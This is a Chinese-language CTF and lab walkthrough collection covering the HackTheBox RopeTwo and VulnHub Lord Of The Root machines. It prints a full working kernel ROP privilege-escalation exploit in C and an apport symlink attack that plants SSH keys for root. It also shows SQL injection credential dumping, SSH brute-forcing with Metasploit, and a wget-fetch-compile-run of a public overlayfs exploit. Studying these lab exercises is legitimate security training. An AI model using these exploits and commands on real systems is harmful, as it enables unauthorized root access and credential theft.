root@kali# grep ': mov rdi, rax' gadgets | grep -v -e call -e 'jmp 0x'
0xffffffff8112e597 : mov rdi, rax ; cmp r8, rdx ; jne 0xffffffff8112e57c ; pop rbp ; ret
0xffffffff814ed7ea : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff814ed7dd ; pop rbp ; ret
0xffffffff814ed84c : mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff814ed83d ; pop rbp ; ret
0xffffffff8102f7ff : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; pop rbp ; ret
0xffffffff828f29f4 : mov rdi, rax ; xor eax, eax ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret

root@kali# grep ': pop r8 ; ret' gadgets | head -1
0xffffffff814875b2 : pop r8 ; ret
root@kali# grep ': pop rdx ; ret' gadgets | head -1
0xffffffff8103bbc2 : pop rdx ; ret
```

看看列表中的第一个，只要R8等于RDX，它就会跳过跳转，弹出RBP，然后返回。可以做到:

``` bash
st_ptr[st_idx++] = pop_r8;
st_ptr[st_idx++] = 0;
st_ptr[st_idx++] = pop_rdx;
st_ptr[st_idx++] = 0;
st_ptr[st_idx++] = mov_rax_rdi_cmp_pop_rbp;
st_ptr[st_idx++] = 0;
st_ptr[st_idx++] = commit_creds;
```

代码将把0放到R8和RDX中，然后调用gadget将返回值从RAX移动到RDI，然后是RBP pop的最后一个0。然后，RDI包含来自prepare_kernel_cred的返回值，它调用commit_creds。

现在，creds已经到位，需要代码来返回用户区。首先，swapgs将用它在用户空间中运行所需的值交换内核的GS基寄存器。有一个带有swapgs和pop rbp的gadget可以工作:

``` bash
st_ptr[st_idx++] = swapgs_pop_rbp;
st_ptr[st_idx++] = 0;
```

然后sysretq指令将返回到useland。这通常用于从[系统调用返回](http://www.ijack.org.uk/syscalls.html)。需要在RCX中设置返回地址，并在R11中设置标志。将写一个简短的函数，想跳转到作为root:

``` bash
void shell() {
    if(!getuid()) {
        system("/bin/sh");
    } else {
        puts("[-] Failed");
        exit(-1);
    }
}
```

R11中的内容似乎并不重要，所以将使用0。

``` bash
st_ptr[st_idx++] = pop_rcx;
st_ptr[st_idx++] = &shell;
st_ptr[st_idx++] = pop_r11;
st_ptr[st_idx++] = 0x0;
st_ptr[st_idx++] = sysretq;
```

#### 触发

现在剩下要做的就是通过关闭/dev/ptmx.的句柄来触发ROP这应该会导致在这个进程中运行/bin/sh，但如果失败，将打印一条消息并返回1:

``` bash
// trigger ROP
printf("[*] Triggering ROP\n");
close(ptmx);
printf("[-] Exploit failed.\n");
return 1;
```

#### shell

完整的exp源码在这里。对于所有的代码片段，将编译并上传到RopeTwo机器:

 - exploit.c

``` bash
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

int fd, ptmx;

struct user_data_struct {
    uint64_t id;
    uint64_t size;
    void* data;
} user_data;


long create_buf(uint64_t id, uint64_t size){
    user_data.id = id;
    user_data.size = size;
    return ioctl(fd, 0x1000, &user_data);
}

long delete_buf(uint64_t id) {
    user_data.id = id;
    return ioctl(fd, 0x1001, &user_data);
}


long write_buf(uint64_t id, uint64_t size, void *data){
    user_data.id = id;
    user_data.size = size;
    user_data.data = data;
    return ioctl(fd, 0x1002, &user_data);
}


long read_buf(uint64_t id, uint64_t size, void *data){
    user_data.id = id;
    user_data.size = size;
    user_data.data = data;
    return ioctl(fd, 0x1003, &user_data);
}


void shell() {
    if(!getuid()) {
        system("/bin/sh");
    } else {
        puts("[-] Failed");
        exit(-1);
    }
}


int main(int argc) {

    int i, id;
    int ptmx;
    uint64_t *output = malloc(0x420);
    uint64_t kernel_base;
    
    fd = open("/dev/ralloc", O_RDONLY);
    if(fd == -1) {
        fprintf(stderr, "Failed to open /dev/ralloc");
        return -1;
    }

    kernel_base = 0;
    while(kernel_base == 0) {
        // Clear buffers  
        for(i=0; i < 0x20; i++){
            delete_buf(i);
        }
        
        // Loop over buffers, create, open ptmx, check for tty_struct
        for(i=0; i < 0x20; i++){
            create_buf(i, 0x400); 
            ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);

            read_buf(i, 0x420, output);
            if((output[0x80] & 0xffffffff) == 0x5401 &&
               (output[0x83] & 0xfff) == 0x6a0) {
                break;
            }
            close(ptmx); // close if not found
        }

        if (i == 0x20){
            printf("[-] Failed to find tty_struct. Try again.\n");
        } else {
            uint64_t ptm_unix98_ops = output[0x83];
            printf("[+] Identified ptm_unix98_ops address: %016lx\n", ptm_unix98_ops);
            kernel_base = ptm_unix98_ops - 0x10af6a0;
            printf("[+] Identified kernel base address:    %016lx\n", kernel_base);
            id = i;
        }
    }

    printf("[*] Using slot %i\n", id);

    // Stack Pivot
    size_t xchg_esp_eax = 0x368c08 + kernel_base;
    uint64_t *fake_tty_ops = malloc(248);
    fake_tty_ops[4] = xchg_esp_eax;
    output[0x83] = (uint64_t)fake_tty_ops;
    write_buf(id, 0x420, output);

    uint64_t new_stack = xchg_esp_eax & 0xffffffff;
    uint64_t *st_ptr = new_stack;
    int st_idx = 0;

    // Set Permissions
    mmap((void *)(new_stack & 0xfffff000), 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    // Offsets
    uint64_t ret = 0x0001cc + kernel_base;
    uint64_t pop_rdi = 0x08b8a0 + kernel_base;
    uint64_t prepare_kernel_cred = 0x0c07a0 + kernel_base;
    uint64_t pop_r8 = 0x4875b2 + kernel_base;
    uint64_t pop_rdx = 0x03bbc2 + kernel_base;
    uint64_t mov_rax_rdi_cmp_pop_rbp = 0x12e597 + kernel_base;
    uint64_t commit_creds = 0x0c0540 + kernel_base;
    uint64_t swapgs_pop_rbp = 0x074b54 + kernel_base;
    uint64_t pop_rcx = 0x405ea6 + kernel_base;
    uint64_t pop_r11 = 0x54c2d5 + kernel_base;
    uint64_t sysretq = 0x075444 + kernel_base;

    // ROP
    st_ptr[st_idx++] = ret;
    st_ptr[st_idx++] = pop_rdi;
    st_ptr[st_idx++] = 0;
    st_ptr[st_idx++] = prepare_kernel_cred;

    st_ptr[st_idx++] = pop_r8;
    st_ptr[st_idx++] = 0;
    st_ptr[st_idx++] = pop_rdx;
    st_ptr[st_idx++] = 0;
    st_ptr[st_idx++] = mov_rax_rdi_cmp_pop_rbp;
    st_ptr[st_idx++] = 0;
    st_ptr[st_idx++] = commit_creds;

    st_ptr[st_idx++] = swapgs_pop_rbp;
    st_ptr[st_idx++] = 0;
    st_ptr[st_idx++] = pop_rcx;
    st_ptr[st_idx++] = &shell;
    st_ptr[st_idx++] = pop_r11;
    st_ptr[st_idx++] = 0x0;
    st_ptr[st_idx++] = sysretq;

    // trigger ROP
    printf("[*] Triggering ROP\n");
    close(ptmx);
    printf("[-] Exploit failed.\n");
    return 1;
}
```

有时候会失败，但多运行它几次似乎会get shell:

``` bash
root@kali# gcc -w -o exploit exploit.c ; scp -i id_rsa exploit r4j@10.10.10.196:/tmp/exp
exploit                        100%   17KB 532.3KB/s   00:00 
```

``` bash
r4j@rope2:/tmp$ ./exp
[+] Identified ptm_unix98_ops address: ffffffffa1caf6a0
[+] Identified kernel base address:    ffffffffa0c00000
[*] Using slot 1
[*] Triggering ROP
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
13153a2c6742569c92f7c15be2e249e5
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot3.jpg)

#### Extra - 非预期获取root的方法

#### 寻找漏洞

第一个解决这个问题的团队使用了一条被HTB团队迅速修补的意外路径。他们发现的漏洞让他们从chromeuser转到一个漏洞的root。这个团队的一个成员jkr帮助重新创建了这个漏洞。

这个box于2020年6月27日发布。在apt日志中，两天后的6月29日，apport被删除了:

``` bash
root@rope2:/var/log/apt# zcat history.log.1.gz 

Start-Date: 2020-06-03  12:00:07
Commandline: apt install ifupdown
Install: ifupdown:amd64 (0.8.35ubuntu1)
End-Date: 2020-06-03  12:00:09

Start-Date: 2020-06-29  18:40:31
Commandline: apt purge apport
Purge: apport:amd64 (2.20.10-0ubuntu27.3)
End-Date: 2020-06-29  18:40:33
```

删除的版本是2.20.10-0ubuntu27.3。一些谷歌搜索显示[CVE-2020-8831](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8831)。现在作为RopeTwo上的root用户，可以重新配置机器，使其再次受到此路径的攻击。

#### 安装旧的apport

apport是一个用来[拦截崩溃并记录信息](https://wiki.ubuntu.com/Apport)的程序，这样就可以在不重新创建崩溃的情况下进行调试/故障排除。

要安装这个较旧的、易受攻击的apport版本，将使用apt。需要首先修复更新源文件:

``` bash
root@rope2:~# cat /etc/apt/sources.list
deb http://old-releases.ubuntu.com/ubuntu disco main universe multiverse restricted
deb http://old-releases.ubuntu.com/ubuntu disco-updates main universe multiverse restricted
```

因为RopeTwo机器不能直接与互联网通信，将通过我的burpsuite代理apt。在本地机器上更改了Burp，这样它就可以监听所有接口，而不仅仅是localhost:

``` bash
*:8080
```

还将设置http_proxy环境变量来告诉apt使用这个代理:

``` bash
root@rope2:~# export http_proxy=http://10.10.14.14:8080
```

现在运行apt update，然后apt install apport=2.20.10-0ubuntu27.3。

#### exploit
#### 背景

这里的漏洞利用了apport写入/var/lock目录的方式。该目录可由任何用户写入:

``` bash
chromeuser@rope2:~$ ls -ld /var/lock/
drwxrwxrwt 4 root root 80 Jan 15 16:27 /var/lock/
```

当出现segfaults时，apport将在该文件夹中创建一个目录apport，其中包含一个文件lock。漏洞在于它如何处理符号链接。将创建一个链接，将/var/lock/apport指向想写入的目录，如/etc/update-motd。d(在前面的回溯中已经展示了如何对这个目录进行写操作)。如果可以在该文件夹中获得一个可以写入的文件，然后使用ssh或su登录，那么它将以root身份运行。

#### 练习

作为chromeuser在以root用户重新安装apport后，进入/var/lock。目前没有apport目录:

``` bash
chromeuser@rope2:/var/lock$ ls
lvm  subsys
```

创建一个符号链接:

``` bash
chromeuser@rope2:/var/lock$ ln -s /etc/update-motd.d apport
chromeuser@rope2:/var/lock$ ls -l
total 0
lrwxrwxrwx 1 chromeuser chromeuser 18 Jan 15 19:01 apport -> /etc/update-motd.d
drwx------ 2 root       root       40 Jan 15 18:52 lvm
drwxr-xr-x 2 root       root       40 Jan 15 18:52 subsys
```

现在需要crash个东西。可以再次运行heap攻击，或者用信号11杀死某些东西

``` bash
chromeuser@rope2:/var/lock$ sleep 100000 &
[1] 3574
chromeuser@rope2:/var/lock$ kill -11 3574
[1]+  Segmentation fault      (core dumped) sleep 100000
```

这会在/etc/update-motd.d中创建一个新文件，最后一个，lock:

``` bash
chromeuser@rope2:/etc/update-motd.d$ ls -l
total 40
-rwxr-xr-x 1 root root 1220 Aug  6  2018 00-header
-rwxr-xr-x 1 root root 1157 Aug  6  2018 10-help-text
lrwxrwxrwx 1 root root   46 Apr 16  2019 50-landscape-sysinfo -> /usr/share/landscape/landscape-sysinfo.wrapper
-rwxr-xr-x 1 root root 4264 Aug 21  2018 50-motd-news
-rwxr-xr-x 1 root root   97 Apr  9  2018 90-updates-available
-rwxr-xr-x 1 root root  299 Aug 10  2018 91-release-upgrade
-rwxr-xr-x 1 root root  129 Apr  9  2018 95-hwe-eol
-rwxr-xr-x 1 root root  111 Nov 13  2018 97-overlayroot
-rwxr-xr-x 1 root root  142 Apr  9  2018 98-fsck-at-reboot
-rwxr-xr-x 1 root root  144 Apr  9  2018 98-reboot-required
-rwxrwxrwx 1 root root    0 Jan 15 19:02 lock
```

注意，它是world writable。

已经在/home/chromeuser/.ssh/authorized_keys中有公钥。将使用这个Bash脚本复制到/root/.ssh/authorized_keys:

 - getroot.sh

``` bash
#!/bin/bash

echo "pwned!"
mkdir /root/.ssh
cat /home/chromeuser/.ssh/authorized_keys >> /root/.ssh/authorized_keys
```

现在将SSH作为chromeuser再次触发MOTD脚本:

``` bash
root@kali# ssh -i ~/keys/ed25519_gen chromeuser@10.10.10.196
Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 15 19:07:21 UTC 2021

  System load:  0.31               Processes:             317
  Usage of /:   41.7% of 19.56GB   Users logged in:       3
  Memory usage: 29%                IP address for ens160: 10.10.10.196
  Swap usage:   0%


71 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


pwned!
Last login: Fri Jan 15 19:05:14 2021 from 10.10.14.14
chromeuser@rope2:~$
```

它上面写着“pwned!”就在提示符上方显示漏洞生效了。可以以root身份SSH连接:

``` bash
root@kali# ssh -i ~/keys/ed25519_gen root@10.10.10.196
Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 15 19:08:09 UTC 2021

  System load:  0.26               Processes:             322
  Usage of /:   41.7% of 19.56GB   Users logged in:       3
  Memory usage: 29%                IP address for ens160: 10.10.10.196
  Swap usage:   0%


71 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


pwned!
Last login: Fri Jan 15 19:05:25 2021 from 10.10.14.14
root@rope2:~#
```

 - Thanks for reading.

<font color="red">***Damn! Really a Journey to the Hell! Ha?***</font>

<!-- kb:end hackthebox-rope2-getroot -->

</details>

<a id="case-lord-of-the-root-1-0-1"></a>

## 端口序列与多种本地提权

从端口访问序列和 SQL 时间侧信道到本地执行，再分别分析 OverlayFS、SUID 二进制和 MySQL UDF。不同提权路径保留各自前提。

<p class="kb-provenance">来源 Lord-Of-The-Root-1-0-1 · 原记录 2020-01-24 · 43 个代码块 · 6 处图片引用</p>

<details class="kb-evidence" id="record-lord-of-the-root-1-0-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Lord-Of-The-Root-1-0-1 -->

#### 名称

名称：Lord Of The Root: 1.0.1
发行日期：2015年9月23日

#### 下载

 - Download: http://www.mediafire.com/download/m5tbx0dua05szjm/LordOfTheRoot.ova
 - Download (Mirror): https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova
 - Download (Torrent): https://download.vulnhub.com/lordoftheroot/LordOfTheRoot_1.0.1.ova.torrent

#### 描述

创建这台机器是为了帮助其他人学习一些基本的CTF hack技巧和一些工具。这台机器的难度与我在OSCP上遇到的难度非常相似。这是一个引导到root的靶机，不需要任何来宾交互。有两种设计的权限提升方法。

 - 23/09/2015 == v1.0.1
 - 22/09/2015 == v1.0



如果您在使用VirtualBox时遇到问题，请尝试以下操作：

 - 下载LordOfTheRoot_1.0.1.ova（确认文件哈希）
 - 下载并安装了VMWare ovftool。
 - 使用ovftool将OVA转换为OVF。
 - 使用文本编辑器修改了OVF，并执行以下操作：将所有对“ElementName”的引用替换为“标题”，将对“vmware.sata.ahci”的单个引用替换为“AHCI”
 - 保存了OVF。+删除.mf（清单）文件。如果不这样做，则在导入时会出现错误，说SHA与OVF不匹配（尝试过修改哈希，但没有成功）。
 - 尝试导入OVF文件，应该可以正常工作。

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.113
Host is up (0.00022s latency).
MAC Address: 08:00:27:0B:D4:69 (Oracle VirtualBox virtual NIC)
```

``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
```

连接一下ssh试试

``` bash
root@kali:~# ssh 192.168.56.113
The authenticity of host '192.168.56.113 (192.168.56.113)' can't be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.113' (ECDSA) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
Enter passphrase for key '/root/.ssh/id_rsa': 
root@192.168.56.113's password:
```

当搜索SSH时，它说``Knock Friend To Enter''和``Easy as 123''，然后要求输入我们不知道的密码。现在，这暗示着端口碰撞。试试看：

``` bash
root@kali:~# nmap -r -Pn -p 1,2,3 192.168.56.113 -v
PORT  STATE    SERVICE
1/tcp filtered tcpmux
2/tcp filtered compressnet
3/tcp filtered compressnet
MAC Address: 08:00:27:0B:D4:69 (Oracle VirtualBox virtual NIC)
```

现在再次启动nmap扫描。希望这次的结果中有多个端口。

``` bash
root@kali:~# nmap -p- -A -v 192.168.56.113 --min-rate=10000
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

如所见，与我们之前的扫描相比，还有一个开放的端口，即1337，它有HTTP服务，这就是想要的，因为默认情况下80端口没有打开。让我们通过此端口打开目标IP。

``` bash
http://192.168.56.113:1337/
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub183.jpg)

如上所示，打开的页面仅包含一张图片，然后还检查了其源代码，但没有任何线索。通常，总是有一些将robots.txt文件放入网络目录的机会，因此，在渗透任何系统时，都应始终检查robots.txt文件。在这里，已经在地址192.168.56.113:1337/robots.txt中对robots.txt进行了测试，将打开一个新的网页，显示以下图片。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub184.jpg)

#### getshell

之后，我们查看了其源代码并找到了base64的编码值。

``` bash
<html>
<img src="/images/hipster.jpg" align="middle">
<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
</html>
```

解码

``` bash
root@kali:~# echo "THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh" | base64 -d
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!root@kali:~# echo "Lzk3ODM0NTIxMC9pbmRleC5waHA=" | base64 -d
/978345210/index.php
```

访问以下的url

``` bash
http://192.168.56.113:1337/978345210/index.php
```

现在，有一个登录口。尝试SQL注入的帮助下登录，使用sqlmap。
由于不知道确切的用户名和密码，因此，使用SQLMAP进行基于登录表单的注入，通过执行以下命令来检索数据库名称和登录凭据。

时间盲注，好慢。。。最后，显示用户名和密码。

``` bash
root@kali:~# sqlmap -u "http://192.168.56.113:1337/978345210/index.php" --forms -D Webapp -T Users --dump --batch
Database: Webapp
Table: Users
[5 entries]
+----+------------------+----------+
| id | password         | username |
+----+------------------+----------+
| 1  | iwilltakethering | frodo    |
| 2  | MyPreciousR00t   | smeagol  |
| 3  | AndMySword       | aragorn  |
| 4  | AndMyBow         | legolas  |
| 5  | AndMyAxe         | gimli    |
+----+------------------+----------+
```

将所有这些用户名和密码保存在两个不同的文本文件中。并借助方法在SSH登录暴力破解使用此文本文件。执行攻击，请转到Kali的终端并通过键入msfdb run并进一步键入来打开Metasploit：

``` bash
root@kali:~/vulnhub/lordoftheroot# msfdb run
[+] Starting database
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                                                                    
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                  
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                 
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                                
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                                
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                                
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                                
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                                                                 
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                                  
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                                   
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                                    
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                                                     
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                                                       
           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                         
             ;kOOOOOOOOOOOOOOOk:                                                                                           
               ,xOOOOOOOOOOOx,                                                                                             
                 .lOOOOOOOl.                                                                                               
                    ,dOd,                                                                                                  
                      .                                                                                                    

       =[ metasploit v5.0.69-dev                          ]
+ -- --=[ 1959 exploits - 1094 auxiliary - 336 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.56.113
rhosts => 192.168.56.113
msf5 auxiliary(scanner/ssh/ssh_login) > set user_file /root/vulnhub/lordoftheroot/user.txt
user_file => /root/vulnhub/lordoftheroot/user.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set pass_file /root/vulnhub/lordoftheroot/pass.txt
pass_file => /root/vulnhub/lordoftheroot/pass.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
stop_on_success => true
msf5 auxiliary(scanner/ssh/ssh_login) > exploit

[+] 192.168.56.113:22 - Success: 'smeagol:MyPreciousR00t' ''
[*] Command shell session 1 opened (192.168.56.102:43037 -> 192.168.56.113:22) at 2020-01-25 12:36:48 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

得到正确的用户名和密码

``` bash
smeagol/MyPreciousR00t
```

此外，Metasploit通过提供远程系统命令shell（未经授权访问受害者系统）提供了额外的好处。现在开始渗透访问root权限。然后，要访问适当的TTY Shell，键入以下python一行脚本：

``` bash
msf5 auxiliary(scanner/ssh/ssh_login) > sessions 1
[*] Starting interaction with 1...

Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)

 * Documentation:  https://help.ubuntu.com/

                            .____    _____________________________                              
                            |    |   \_____  \__    ___/\______   \                             
                            |    |    /   |   \|    |    |       _/                             
                            |    |___/    |    \    |    |    |   \                             
                            |_______ \_______  /____|    |____|_  /                             
                                    \/       \/                 \/                              
 __      __       .__                                ___________      .__                   .___
/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | 
 \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | 
  \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >  \___  /   |__|  |__|\___  >___|  /\____ | 
       \/       \/          \/            \/     \/       \/                  \/     \/      \/ 
python -c 'import pty;pty.spawn("/bin/bash")'
smeagol@LordOfTheRoot:~$ id
id
uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
smeagol@LordOfTheRoot:~$ whoami
whoami
smeagol
smeagol@LordOfTheRoot:~$
```

#### 提权1:搜索exploit来提权

到达终端。在这里，键入以下命令以了解内核的版本：

``` bash
smeagol@LordOfTheRoot:~$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.3 LTS
Release:        14.04
Codename:       trusty
```

版本是14.04，幸运的是，对此版本有一个exploit。在Kali终端中，搜索以下类型的漏洞：

``` bash
root@kali:~# searchsploit ubuntu 14.04
---------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------- ----------------------------------------
Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation           | exploits/linux/local/37088.c
Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation                       | exploits/linux/local/36782.sh
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 /  | exploits/linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ld | exploits/linux_x86/local/42276.c
Linux Kernel (Ubuntu 14.04.3) - 'perf_event_open()' Can Race with execve() (Acces | exploits/linux/local/39771.txt
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local P | exploits/linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local P | exploits/linux/local/37293.txt
Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free usb-midi SM | exploits/linux/local/41999.txt
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation  | exploits/linux/local/39166.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privi | exploits/linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race C | exploits/linux/local/47170.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | exploits/linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - L | exploits/linux/local/47169.c
NetKit FTP Client (Ubuntu 14.04) - Crash/Denial of Service (PoC)                  | exploits/linux/dos/37777.txt
Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation   | exploits/linux/local/41762.txt
WebKitGTK 2.1.2 (Ubuntu 14.04) - Heap based Buffer Overflow                       | exploits/linux/local/44204.md
usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation         | exploits/linux/local/36820.txt
---------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

选下面这个exploit，当然，自己也可以去尝试其他的exploit，我这里为了节约时间就不演示了。。。

``` bash
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation  | exploits/linux/local/39166.c
```

借助cp命令将漏洞exploit复制到当前目录，然后运行HTTP python服务器将其转移到目标计算机中。

``` bash
root@kali:~/vulnhub/lordoftheroot# cp /usr/share/exploitdb/exploits/linux/local/39166.c .
root@kali:~/vulnhub/lordoftheroot# ls
39166.c  pass.txt  user.txt
root@kali:~/vulnhub/lordoftheroot# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
```

在shell中编译exp，然后赋予权限，运行生成的exp进行提权，可以看到提权成功，非常的简单

``` bash
smeagol@LordOfTheRoot:~$ wget http://192.168.56.102:8000/39166.c
wget http://192.168.56.102:8000/39166.c
--2020-01-25 18:52:13--  http://192.168.56.102:8000/39166.c
Connecting to 192.168.56.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2789 (2.7K) [text/plain]
Saving to: ‘39166.c’

100%[======================================>] 2,789       --.-K/s   in 0s      

2020-01-25 18:52:13 (575 MB/s) - ‘39166.c’ saved [2789/2789]

smeagol@LordOfTheRoot:~$ gcc 39166.c -o exp
gcc 39166.c -o exp
smeagol@LordOfTheRoot:~$ chmod 777 exp
chmod 777 exp
smeagol@LordOfTheRoot:~$ ./exp
./exp
root@LordOfTheRoot:~# id
id
uid=0(root) gid=1000(smeagol) groups=0(root),1000(smeagol)
root@LordOfTheRoot:~# whoami
whoami
root
```

最后找到flag，挑战结束

``` bash
root@LordOfTheRoot:/root# cat Flag.txt
cat Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub185.jpg)


